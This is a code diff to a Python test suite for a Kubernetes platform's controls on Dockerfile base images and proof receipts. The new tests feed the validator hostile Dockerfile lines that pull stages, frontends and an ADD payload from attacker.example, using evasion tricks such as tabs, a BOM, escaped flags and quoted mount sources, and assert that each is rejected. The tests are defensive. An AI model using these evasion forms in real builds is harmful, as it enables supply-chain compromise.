@@ -925,7 +925,7 @@ class KubernetesPlatformContractTests(unittest.TestCase):
             ):
                 self.reference.controlled_oci_dockerfile(Path("apps/api/Dockerfile"))
 
-    def test_strict_oci_dockerfile_allows_prior_stage_alias(self) -> None:
+    def test_strict_oci_dockerfile_rejects_tab_separated_external_stage(self) -> None:
         lock = json.loads(
             (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
         )
@@ -933,7 +933,129 @@ class KubernetesPlatformContractTests(unittest.TestCase):
         debian = lock["images"]["build_debian"]
         source = (
             f"FROM {rust['local_ref']}@{rust['digest']} AS builder\n"
+            f"FROM {debian['local_ref']}@{debian['digest']}\n"
+            "FROM\tattacker.example/unreviewed:latest AS injected\n"
+        )
+        with mock.patch.dict(
+            os.environ, {self.reference.OCI_STRICT_ENV: "1"}
+        ), mock.patch.object(
+            self.reference, "_oci_mirror_lock", return_value=lock
+        ), mock.patch.object(
+            self.reference.Path, "read_text", return_value=source
+        ):
+            with self.assertRaisesRegex(
+                self.reference.ProofError, "uncontrolled OCI base image"
+            ):
+                self.reference.controlled_oci_dockerfile(Path("apps/api/Dockerfile"))
+
+    def test_strict_oci_dockerfile_rejects_bom_prefixed_external_stage(self) -> None:
+        lock = json.loads(
+            (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
+        )
+        rust = lock["images"]["build_rust"]
+        debian = lock["images"]["build_debian"]
+        source = (
+            "\ufeffFROM attacker.example/unreviewed:latest AS injected\n"
+            f"FROM {rust['local_ref']}@{rust['digest']} AS builder\n"
+            f"FROM {debian['local_ref']}@{debian['digest']}\n"
+            "COPY --from=injected /payload /payload\n"
+        )
+        with mock.patch.dict(
+            os.environ, {self.reference.OCI_STRICT_ENV: "1"}
+        ), mock.patch.object(
+            self.reference, "_oci_mirror_lock", return_value=lock
+        ), mock.patch.object(
+            self.reference.Path, "read_text", return_value=source
+        ):
+            with self.assertRaisesRegex(
+                self.reference.ProofError, "uncontrolled OCI base image"
+            ):
+                self.reference.controlled_oci_dockerfile(Path("apps/api/Dockerfile"))
+
+    def test_strict_oci_dockerfile_rejects_adjacent_external_sources(self) -> None:
+        lock = json.loads(
+            (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
+        )
+        rust = lock["images"]["build_rust"]
+        debian = lock["images"]["build_debian"]
+        controlled = (
+            f"FROM {rust['local_ref']}@{rust['digest']} AS builder\n"
             f"FROM {debian['local_ref']}@{debian['digest']} AS runtime\n"
+        )
+        cases = {
+            "continued-from": (
+                controlled
+                + "FROM\\\n attacker.example/unreviewed:latest AS injected\n"
+            ),
+            "external-frontend": (
+                "# syntax=attacker.example/dockerfile:latest\n" + controlled
+            ),
+            "external-copy": (
+                controlled
+                + "COPY --from=attacker.example/payload:latest /payload /payload\n"
+            ),
+            "external-run-mount": (
+                controlled
+                + "RUN --mount=type=bind,from=attacker.example/payload:latest "
+                + "cat /payload\n"
+            ),
+            "escaped-copy-flag": (
+                controlled
+                + r"COPY --fr\om=attacker.example/payload:latest /payload /payload"
+                + "\n"
+            ),
+            "quoted-run-mount-source": (
+                controlled
+                + 'RUN --mount=type=bind,"from=attacker.example/payload:latest",'
+                + "target=/payload cat /payload\n"
+            ),
+            "escaped-run-mount-flag": (
+                controlled
+                + r"RUN --mo\unt=type=bind,from=attacker.example/payload:latest,target=/payload cat /payload"
+                + "\n"
+            ),
+            "escaped-run-mount-source-key": (
+                controlled
+                + r"RUN --mount=type=bind,fr\om=attacker.example/payload:latest,target=/payload cat /payload"
+                + "\n"
+            ),
+            "even-trailing-escapes-before-external-from": (
+                controlled
+                + r"RUN true \\"
+                + "\nFROM attacker.example/unreviewed:latest AS injected\n"
+            ),
+            "unicode-decimal-copy-stage": (
+                controlled + "COPY --from=٠ /payload /payload\n"
+            ),
+            "deferred-onbuild": controlled + "ONBUILD COPY . /payload\n",
+            "remote-add": controlled + "ADD https://attacker.example/payload /payload\n",
+        }
+        for label, source in cases.items():
+            with self.subTest(label=label), mock.patch.dict(
+                os.environ, {self.reference.OCI_STRICT_ENV: "1"}
+            ), mock.patch.object(
+                self.reference, "_oci_mirror_lock", return_value=lock
+            ), mock.patch.object(
+                self.reference.Path, "read_text", return_value=source
+            ):
+                with self.assertRaises(self.reference.ProofError):
+                    self.reference.controlled_oci_dockerfile(
+                        Path("apps/api/Dockerfile")
+                    )
+
+    def test_strict_oci_dockerfile_accepts_buildkit_stage_whitespace_and_case(
+        self,
+    ) -> None:
+        lock = json.loads(
+            (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
+        )
+        rust = lock["images"]["build_rust"]
+        debian = lock["images"]["build_debian"]
+        source = (
+            f"FROM\v{rust['local_ref']}@{rust['digest']} AS Builder\n"
+            f"FROM\f{debian['local_ref']}@{debian['digest']} AS Runtime\n"
+            "COPY --from=builder /payload /payload\n"
+            "COPY --from=0 /payload0 /payload0\n"
             "FROM builder AS exported-builder\n"
         )
         with mock.patch.dict(
@@ -946,8 +1068,35 @@ class KubernetesPlatformContractTests(unittest.TestCase):
             rewritten = self.reference.controlled_oci_dockerfile(
                 Path("apps/api/Dockerfile")
             )
-        self.assertIn(f"FROM {rust['local_ref']} AS builder", rewritten)
-        self.assertIn(f"FROM {debian['local_ref']} AS runtime", rewritten)
+        self.assertIn(f"FROM\v{rust['local_ref']} AS Builder", rewritten)
+        self.assertIn(f"FROM\f{debian['local_ref']} AS Runtime", rewritten)
+        self.assertIn("COPY --from=builder", rewritten)
+        self.assertIn("COPY --from=0", rewritten)
+        self.assertIn("FROM builder AS exported-builder", rewritten)
+
+    def test_strict_oci_dockerfile_allows_prior_stage_alias(self) -> None:
+        lock = json.loads(
+            (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
+        )
+        rust = lock["images"]["build_rust"]
+        debian = lock["images"]["build_debian"]
+        source = (
+            f"FROM {rust['local_ref']}@{rust['digest']} AS Builder\n"
+            f"FROM {debian['local_ref']}@{debian['digest']} AS Runtime\n"
+            "FROM builder AS exported-builder\n"
+        )
+        with mock.patch.dict(
+            os.environ, {self.reference.OCI_STRICT_ENV: "1"}
+        ), mock.patch.object(
+            self.reference, "_oci_mirror_lock", return_value=lock
+        ), mock.patch.object(
+            self.reference.Path, "read_text", return_value=source
+        ):
+            rewritten = self.reference.controlled_oci_dockerfile(
+                Path("apps/api/Dockerfile")
+            )
+        self.assertIn(f"FROM {rust['local_ref']} AS Builder", rewritten)
+        self.assertIn(f"FROM {debian['local_ref']} AS Runtime", rewritten)
         self.assertIn("FROM builder AS exported-builder", rewritten)
 
     def test_strict_image_builds_consume_dockerfiles_from_stdin(self) -> None:
@@ -1310,6 +1459,14 @@ class KubernetesPlatformContractTests(unittest.TestCase):
         self.assertNotIn("SOURCE_REF:", proof_text)
         self.assertNotIn("github.head_ref || github.ref_name", proof_text)
 
+    def test_proof_identity_covers_all_api_image_inputs(self) -> None:
+        for suite in ("kind-gitops", "ha-recovery"):
+            selectors = set(self.proof_identity.SUITE_INPUTS[suite])
+            self.assertIn("configs/", selectors)
+            self.assertIn("scripts/ops/", selectors)
+            self.assertIn("apps/api/", selectors)
+            self.assertIn("scripts/dev/", selectors)
+
     def test_proof_identity_ignores_unrelated_inputs_and_rejects_tampering(self) -> None:
         commit = "0123456789abcdef0123456789abcdef01234567"
         with tempfile.TemporaryDirectory() as tmp:
@@ -1474,16 +1631,22 @@ class KubernetesPlatformContractTests(unittest.TestCase):
             cluster_image = {
                 "canonical": lock["images"]["runtime"]["canonical"],
                 "local_ref": runtime_ref,
+                "digest_ref": f"{runtime_ref}@{digest}",
                 "runtime_ref": runtime_ref,
                 "locked_index_digest": digest,
-                "cri_image_id": image_id,
                 "image_id": image_id,
+                "cri_image_id": image_id,
                 "platform_target_digest": platform_digest,
                 "nodes": [
                     {
                         "node": "proof-control-plane",
                         "runtime_ref": runtime_ref,
                         "image_id": image_id,
+                        "repo_tags": [runtime_ref],
+                        "repo_digests": [],
+                        "selected_repo_digest": None,
+                        "containerd_target_digest": platform_digest,
+                        "platform_evidence_kind": "containerd_target_digest",
                         "locked_index_digest": digest,
                         "platform_target_digest": platform_digest,
                         "cri_image_status_verified": True,
@@ -1528,28 +1691,172 @@ class KubernetesPlatformContractTests(unittest.TestCase):
                 ):
                     self.proof_identity._validate_controlled_oci_proof(identity, drifted)
                 drifted = json.loads(json.dumps(proof))
-                drifted["oci_controlled_source"]["strict"] = False
-                with self.assertRaisesRegex(
-                    self.proof_identity.IdentityError, "strict controlled OCI"
-                ):
-                    self.proof_identity._validate_controlled_oci_proof(identity, drifted)
-                drifted = json.loads(json.dumps(proof))
-                drifted["oci_controlled_source"]["cluster"]["images"]["runtime"][
-                    "cri_image_id"
-                ] = "sha256:" + "d" * 64
+                drifted["oci_controlled_source"]["host"]["images"]["runtime"]["image_id"] = "sha256:" + "d" * 64
                 with self.assertRaisesRegex(
                     self.proof_identity.IdentityError, "OCI image binding is invalid"
                 ):
                     self.proof_identity._validate_controlled_oci_proof(identity, drifted)
                 drifted = json.loads(json.dumps(proof))
-                drifted["oci_controlled_source"]["cluster"]["images"]["runtime"][
-                    "nodes"
-                ][0]["node"] = "different-control-plane"
+                drifted["oci_controlled_source"]["cluster"]["images"]["runtime"]["nodes"] = []
                 with self.assertRaisesRegex(
-                    self.proof_identity.IdentityError,
-                    "image and blockade node inventories disagree",
+                    self.proof_identity.IdentityError, "node image bindings are missing"
                 ):
                     self.proof_identity._validate_controlled_oci_proof(identity, drifted)
+                drifted = json.loads(json.dumps(proof))
+                drifted["oci_controlled_source"]["cluster"]["registry_blockades"][0]["node"] = "unrelated-node"
+                with self.assertRaisesRegex(
+                    self.proof_identity.IdentityError, "image and blockade nodes disagree"
+                ):
+                    self.proof_identity._validate_controlled_oci_proof(identity, drifted)
+                drifted = json.loads(json.dumps(proof))
+                drifted["oci_controlled_source"]["strict"] = False
+                with self.assertRaisesRegex(
+                    self.proof_identity.IdentityError, "strict controlled OCI"
+                ):
+                    self.proof_identity._validate_controlled_oci_proof(identity, drifted)
+
+    def test_ha_cached_proof_allows_cluster_local_platform_digests(self) -> None:
+        locked = "sha256:" + "a" * 64
+        image_id = "sha256:" + "b" * 64
+        lock = {
+            "images": {
+                "runtime": {
+                    "canonical": f"registry.example/runtime@{locked}",
+                    "local_ref": "registry.example/runtime:local",
+                    "digest": locked,
+                    "suites": ["ha-recovery"],
+                    "load_into_kind": True,
+                }
+            }
+        }
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            lock_path = root / "platform/oci-proof-mirror.lock.json"
+            lock_path.parent.mkdir(parents=True)
+            lock_bytes = (json.dumps(lock, sort_keys=True) + "\n").encode()
+            lock_path.write_bytes(lock_bytes)
+            lock_sha256 = hashlib.sha256(lock_bytes).hexdigest()
+            runtime_ref = lock["images"]["runtime"]["local_ref"]
+
+            def receipt(cluster: str, platform: str) -> dict[str, object]:
+                node = f"{cluster}-control-plane"
+                image = {
+                    "canonical": lock["images"]["runtime"]["canonical"],
+                    "local_ref": runtime_ref,
+                    "digest_ref": f"{runtime_ref}@{locked}",
+                    "runtime_ref": runtime_ref,
+                    "locked_index_digest": locked,
+                    "image_id": image_id,
+                    "cri_image_id": image_id,
+                    "platform_target_digest": platform,
+                    "nodes": [{
+                        "node": node,
+                        "runtime_ref": runtime_ref,
+                        "image_id": image_id,
+                        "repo_tags": [runtime_ref],
+                        "repo_digests": [],
+                        "selected_repo_digest": None,
+                        "containerd_target_digest": platform,
+                        "platform_evidence_kind": "containerd_target_digest",
+                        "locked_index_digest": locked,
+                        "platform_target_digest": platform,
+                        "cri_image_status_verified": True,
+                    }],
+                }
+                blockade = {
+                    "node": node,
+                    "registries": {
+                        registry: {"ipv4": ["127.0.0.1"], "ipv6": ["::1"]}
+                        for registry in self.proof_identity.BLOCKED_REGISTRIES
+                    },
+                }
+                return {
+                    "status": "pass",
+                    "strict": True,
+                    "lock_sha256": lock_sha256,
+                    "cluster": cluster,
+                    "loaded_count": 1,
+                    "images": {"runtime": image},
+                    "registry_blockades": [blockade],
+                }
+
+            proof = {
+                "primary_cluster": "primary",
+                "restore_cluster": "restore",
+                "oci_controlled_source": {
+                    "strict": True,
+                    "host": {
+                        "status": "pass",
+                        "strict": True,
+                        "lock_sha256": lock_sha256,
+                        "selected_count": 1,
+                        "images": {
+                            "runtime": {
+                                "source": "local-verified",
+                                "image_id": image_id,
+                            }
+                        },
+                        "failures": {},
+                    },
+                    "primary_cluster": receipt("primary", "sha256:" + "c" * 64),
+                    "restore_cluster": receipt("restore", "sha256:" + "d" * 64),
+                },
+            }
+            identity = {
+                "suite": "ha-recovery",
+                "oci_mirror_lock_sha256": lock_sha256,
+            }
+            with mock.patch.object(self.proof_identity, "ROOT", root):
+                self.proof_identity._validate_controlled_oci_proof(identity, proof)
+
+                duplicate_cluster = json.loads(json.dumps(proof))
+                duplicate_cluster["restore_cluster"] = "primary"
+                duplicate_cluster["oci_controlled_source"]["restore_cluster"][
+                    "cluster"
+                ] = "primary"
+                with self.assertRaisesRegex(
+                    self.proof_identity.IdentityError, "cluster bindings must be distinct"
+                ):
+                    self.proof_identity._validate_controlled_oci_proof(
+                        identity, duplicate_cluster
+                    )
+
+                foreign_node = json.loads(json.dumps(proof))
+                primary_receipt = foreign_node["oci_controlled_source"][
+                    "primary_cluster"
+                ]
+                primary_receipt["images"]["runtime"]["nodes"][0][
+                    "node"
+                ] = "foreign-control-plane"
+                primary_receipt["registry_blockades"][0][
+                    "node"
+                ] = "foreign-control-plane"
+                with self.assertRaisesRegex(
+                    self.proof_identity.IdentityError, "node cluster binding drifted"
+                ):
+                    self.proof_identity._validate_controlled_oci_proof(
+                        identity, foreign_node
+                    )
+
+                overlapping_nodes = json.loads(json.dumps(proof))
+                overlapping_nodes["restore_cluster"] = "primary-restore"
+                restore_receipt = overlapping_nodes["oci_controlled_source"][
+                    "restore_cluster"
+                ]
+                restore_receipt["cluster"] = "primary-restore"
+                shared_node = "primary-restore-control-plane"
+                for field in ("primary_cluster", "restore_cluster"):
+                    receipt_value = overlapping_nodes["oci_controlled_source"][field]
+                    receipt_value["images"]["runtime"]["nodes"][0][
+                        "node"
+                    ] = shared_node
+                    receipt_value["registry_blockades"][0]["node"] = shared_node
+                with self.assertRaisesRegex(
+                    self.proof_identity.IdentityError, "node inventories overlap"
+                ):
+                    self.proof_identity._validate_controlled_oci_proof(
+                        identity, overlapping_nodes
+                    )
 
     def test_proof_record_rejects_receipt_from_different_checkout(self) -> None:
         identity = {
